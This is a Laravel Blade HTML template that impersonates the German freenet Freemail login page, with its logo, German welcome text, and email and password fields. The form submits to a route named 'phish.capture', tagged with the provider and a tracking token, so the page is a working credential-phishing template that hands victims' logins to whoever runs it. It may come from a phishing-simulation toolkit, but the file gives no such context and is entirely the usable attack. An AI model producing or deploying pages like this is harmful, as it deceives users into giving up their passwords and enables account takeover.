<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>freenet Freemail</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            background: #f0f2f5;
            color: #1a1a1a;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 48px;
            background: #fff;
            height: 60px;
            border-bottom: 1px solid #e0e0e0;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 12px;
            text-decoration: none;
        }

        .logo-icon {
            width: 36px;
            height: 36px;
            background: #0066cc;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 18px;
            font-weight: 700;
        }

        .logo-text {
            font-size: 18px;
            font-weight: 600;
            color: #0066cc;
        }

        .logo-sub {
            font-size: 12px;
            color: #666;
            margin-left: 4px;
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            padding-top: 60px;
        }

        .login-container {
            display: flex;
            width: 800px;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 24px rgba(0,0,0,0.1);
        }

        .left-panel {
            width: 320px;
            background: #0066cc;
            color: #fff;
            padding: 48px 32px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .left-panel h2 {
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 16px;
        }

        .left-panel p {
            font-size: 14px;
            line-height: 1.6;
            opacity: 0.9;
        }

        .right-panel {
            width: 480px;
            background: #fff;
            padding: 48px 40px;
        }

        .right-panel h1 {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 32px;
        }

        .field-group {
            margin-bottom: 20px;
        }

        .field-group label {
            display: block;
            font-size: 14px;
            font-weight: 500;
            color: #333;
            margin-bottom: 6px;
        }

        .field-group input {
            width: 100%;
            height: 44px;
            padding: 0 12px;
            font-size: 14px;
            font-family: inherit;
            color: #1a1a1a;
            background: #fff;
            border: 1px solid #ccc;
            border-radius: 6px;
            outline: none;
        }

        .field-group input:focus {
            border-color: #0066cc;
            box-shadow: 0 0 0 2px rgba(0,102,204,0.15);
        }

        .btn-login {
            width: 100%;
            height: 44px;
            font-size: 15px;
            font-weight: 600;
            font-family: inherit;
            color: #fff;
            background: #0066cc;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            margin-top: 8px;
            margin-bottom: 20px;
        }

        .btn-login:hover { background: #0055aa; }

        .links {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .links a {
            font-size: 13px;
            color: #0066cc;
            text-decoration: none;
        }

        .links a:hover { text-decoration: underline; }

        footer {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 24px;
            padding: 16px 24px;
            font-size: 12px;
            color: #888;
            border-top: 1px solid #e0e0e0;
            background: #fff;
        }

        footer a {
            color: #888;
            text-decoration: none;
        }

        footer a:hover { text-decoration: underline; }
    </style>
</head>
<body>
    <header>
        <a href="#" class="logo">
            <div class="logo-icon">f</div>
            <span class="logo-text">freenet</span>
            <span class="logo-sub">Freemail</span>
        </a>
    </header>

    <main>
        <div class="login-container">
            <div class="left-panel">
                <h2>Willkommen bei freenet Freemail</h2>
                <p>Kostenlose E-Mail-Adresse mit großer Speicherkapazität und zuverlässigem Spam-Schutz.</p>
            </div>
            <div class="right-panel">
                <h1> anmelden</h1>

                <form method="POST" action="{{ route('phish.capture', ['provider' => 'freenet', 'token' => $token ?? '']) }}">
                    @csrf
                    <input type="hidden" name="_token" value="{{ csrf_token() }}">

                    <div class="field-group">
                        <label for="email">E-Mail-Adresse</label>
                        <input type="text" id="email" name="email" placeholder="name@freenet.de" required autocomplete="username" autofocus>
                    </div>

                    <div class="field-group">
                        <label for="password">Passwort</label>
                        <input type="password" id="password" name="password" required autocomplete="current-password">
                    </div>

                    <button type="submit" class="btn-login">Anmelden</button>
                </form>

                <div class="links">
                    <a href="#">Passwort vergessen?</a>
                    <a href="#">Kostenlos registrieren</a>
                </div>
            </div>
        </div>
    </main>

    <footer>
        <a href="#">Hilfe</a>
        <a href="#">Impressum</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
    </footer>
</body>
</html>
